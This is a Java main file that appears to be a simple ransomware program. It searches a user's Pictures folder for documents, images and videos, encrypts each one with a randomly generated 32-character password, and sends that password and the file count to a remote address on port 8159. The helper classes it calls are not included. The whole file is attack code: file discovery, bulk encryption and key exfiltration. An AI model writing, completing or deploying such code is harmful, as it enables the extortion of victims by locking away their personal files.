import java.util.ArrayList;
import java.io.*;

public class Main{
  private static final String ALPHA_NUMERIC_STRING = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";

  public static void main(String[] args) throws Exception{
    ArrayList<String> _FILES = new ArrayList<String>();
    _FILES.add("txt");
    _FILES.add("jpeg");
    _FILES.add("jpg");
    _FILES.add("png");
    _FILES.add("PNG");
    _FILES.add("pdf");
    _FILES.add("mp4");
    _FILES.add("mov");
    FileCreeper C = new FileCreeper(_FILES);
    File folder = new File("C:/Users/odavi/Pictures");
    C.creep(folder);
    FileEncryptor FE = new FileEncryptor();
    String PASSWORD = randomAlphaNumeric(32);

    System.out.println(PASSWORD);
    for(File f:C.PrimaryList){
      FE.EncryptFile(f, PASSWORD);
    }
    ClientConnection con = new ClientConnection();
    con.sendInformation("192.168.31.2", 8159, PASSWORD, C.PrimaryList.size());
  }


  public static String randomAlphaNumeric(int count) {
    StringBuilder builder = new StringBuilder();
    while (count-- != 0) {
      int character = (int)(Math.random()*ALPHA_NUMERIC_STRING.length());
      builder.append(ALPHA_NUMERIC_STRING.charAt(character));
    }
    return builder.toString();
  }
}
